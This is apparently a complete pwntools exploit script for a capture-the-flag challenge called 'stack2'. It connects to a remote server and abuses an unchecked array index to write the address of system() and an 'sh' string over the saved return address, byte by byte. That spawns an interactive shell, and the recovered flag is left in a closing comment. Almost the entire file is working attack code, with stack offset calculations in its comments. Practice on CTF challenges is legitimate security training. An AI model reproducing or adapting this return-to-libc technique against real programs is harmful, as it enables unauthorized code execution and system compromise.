#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("stack2")
libc = elf.libc

gs = '''
continue
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
		return remote("220.249.52.133","56273")
        #return process(elf.path)

# =============================================================================

def welcome():
	print(p.sendlineafter("How many numbers you have:","1"))
	print(p.sendlineafter("Give me your numbers","1"))

	
def change(offset,payload):
	print(p.sendlineafter("5. exit","3"))
	print(p.sendlineafter("which number to change:",offset))
	print(p.sendlineafter("new number:",payload))
	
# =============================================================================
#ebp as 0xFFAE1358 *0xffffd0c8
#esp as 0xFFAE136C *0xffffd0dc

#ebp-0x70= 0xffffd058
#0xffffd0dc-0xffffd058=0x84=132
#system 0x8048450= 	50 84 04 08
#sh 0x8049987= 		87 99 04 08
p=start()

welcome()
change("132","80")
change("133","132")
change("134","4")
change("135","8")
change("140","135")
change("141","153")
change("142","4")
change("143","8")
print(p.sendlineafter("5. exit","5"))
p.recv()
# =============================================================================

p.interactive()
#cyberpeace{e535c3e4acf36b2f10a0bc03a72b550c}
